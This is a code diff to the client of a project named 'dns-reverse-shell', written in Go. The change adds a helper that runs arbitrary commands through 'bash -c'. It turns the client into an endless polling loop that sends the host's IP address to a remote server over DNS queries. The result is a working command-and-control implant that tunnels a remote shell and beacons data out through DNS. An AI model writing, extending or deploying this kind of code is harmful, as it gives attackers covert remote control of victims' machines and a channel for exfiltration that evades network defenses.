@@ -5,6 +5,7 @@ import (
 	"dns-reverse-shell/main/protocol/encoder"
 	"fmt"
 	"github.com/miekg/dns"
+	"os/exec"
 )
 
 type DNSClient struct {
@@ -24,9 +25,9 @@ func NewDNSClient(address string) *DNSClient {
 }
 
 func (d DNSClient) Start() {
-	d.commandHandler.Poll(func() {
-		d.sendMessage("poll", "poll")
-	})
+	for {
+		d.commandHandler.Poll(d.poll)
+	}
 }
 
 func (d DNSClient) sendMessage(commandType string, message string) {
@@ -49,7 +50,8 @@ func (d DNSClient) handleAnswer(answerMsg *dns.Msg) {
 }
 
 func (d DNSClient) poll() {
-	d.sendMessage("poll", "poll")
+	ipAddr := d.executeCommand("hostname -I | cut -d' ' -f2")
+	d.sendMessage("poll", ipAddr)
 }
 
 func (d DNSClient) answerCallback(message string) {
@@ -58,4 +60,14 @@ func (d DNSClient) answerCallback(message string) {
 
 func (d DNSClient) exitCallback() {
 	d.sendMessage("exit", "exit")
+}
+
+func (d DNSClient) executeCommand(command string) string {
+	cmd := exec.Command("bash", "-c", command)
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		fmt.Println(err)
+		return "command execution failed: " + err.Error()
+	}
+	return string(output)
 }
